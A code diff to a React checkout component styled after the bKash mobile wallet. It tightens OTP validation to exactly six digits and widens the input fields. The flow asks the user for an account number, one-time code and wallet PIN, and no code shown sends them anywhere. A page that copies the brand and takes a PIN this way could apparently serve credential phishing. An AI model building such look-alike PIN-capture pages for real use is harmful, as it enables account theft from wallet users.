@@ -354,8 +354,8 @@ export default function OnlineCheckoutGateway({
       }
     } else if (step === 2) {
       // Validate OTP (simulate 6 digits)
-      if (otp.length < 4) {
-        alert('অনুগ্রহ করে সঠিক ভেরিফিকেশন কোডটি লিখুন।');
+      if (otp.length !== 6) {
+        alert('অনুগ্রহ করে সঠিক ৬ ডিজিটের ভেরিফিকেশন কোডটি লিখুন।');
         return;
       }
       setIsBtnSubmitting(true);
@@ -422,7 +422,7 @@ export default function OnlineCheckoutGateway({
 
   const isConfirmDisabled = () => {
     if (step === 1) return accountNumber.length < 11;
-    if (step === 2) return otp.length < 4;
+    if (step === 2) return otp.length !== 6;
     if (step === 3) {
       const requiredLen = type === 'bkash' ? 5 : 4;
       return pin.length < requiredLen;
@@ -978,7 +978,7 @@ export default function OnlineCheckoutGateway({
                         disabled={isBtnSubmitting}
                         onChange={(e) => handleAccountNumberChange(e.target.value)}
                         placeholder="e.g 01XXXXXXXXX"
-                        className="w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[16px] text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white placeholder-zinc-400 disabled:opacity-80 transition-all"
+                        className="w-full max-w-[410px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[16px] text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white placeholder-zinc-400 disabled:opacity-80 transition-all"
                       />
 
                       <div className="terms mt-1 text-white/90 text-[12px] text-center">
@@ -1010,7 +1010,7 @@ export default function OnlineCheckoutGateway({
                         disabled={isBtnSubmitting}
                         onChange={(e) => handleOtpChange(e.target.value)}
                         placeholder="Enter 6 digit code"
-                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
+                        className={`w-full max-w-[410px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
                           otp 
                             ? 'text-[18px] font-semibold tracking-[0.25em]' 
                             : 'text-[15.5px] font-normal tracking-normal'
@@ -1047,7 +1047,7 @@ export default function OnlineCheckoutGateway({
                   {/* STEP 3: PIN ENTER */}
                   {step === 3 && (
                     <div key="step-3" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
-                      <h2 className="text-white/95 text-[14.5px] max-[600px]:text-[12.5px] font-normal mb-1.5 tracking-wide text-center leading-relaxed">
+                      <h2 className="text-white/95 text-[11px] sm:text-[13px] font-normal mb-1.5 tracking-wide text-center leading-relaxed whitespace-nowrap">
                         Enter PIN Of Your bKash Account Number ({obfuscateNumber(accountNumber)})
                       </h2>
                       
@@ -1069,7 +1069,7 @@ export default function OnlineCheckoutGateway({
                         disabled={isBtnSubmitting}
                         onChange={(e) => handlePinChange(e.target.value)}
                         placeholder="Enter PIN"
-                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
+                        className={`w-full max-w-[410px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
                           pin 
                             ? 'text-[22px] font-semibold tracking-[10px] pl-[10px]' 
                             : 'text-[15.5px] font-normal tracking-normal'
